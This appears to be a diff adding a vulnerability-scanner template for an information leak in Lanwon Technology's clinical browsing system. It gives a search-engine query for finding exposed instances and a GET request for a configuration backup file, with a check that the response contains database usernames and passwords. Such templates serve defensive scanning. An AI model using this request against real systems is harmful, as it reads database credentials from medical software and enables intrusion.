@@ -1,0 +1,15 @@
+id: poc-yaml-lanwon-clinical-browsing-system-information-leak
+info:
+  name: 蓝网科技临床浏览系统 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 蓝网科技临床浏览系统
+  hunter: title=="临床浏览"
+requests:
+- method: GET
+  path: /config/config%20bak.txt
+  expression: status_code == 200 && contains(body,"DBUserName=") && contains(body,"DBPassword=")
+    && !contains(body,"<")
+variables: {}
+transport: http
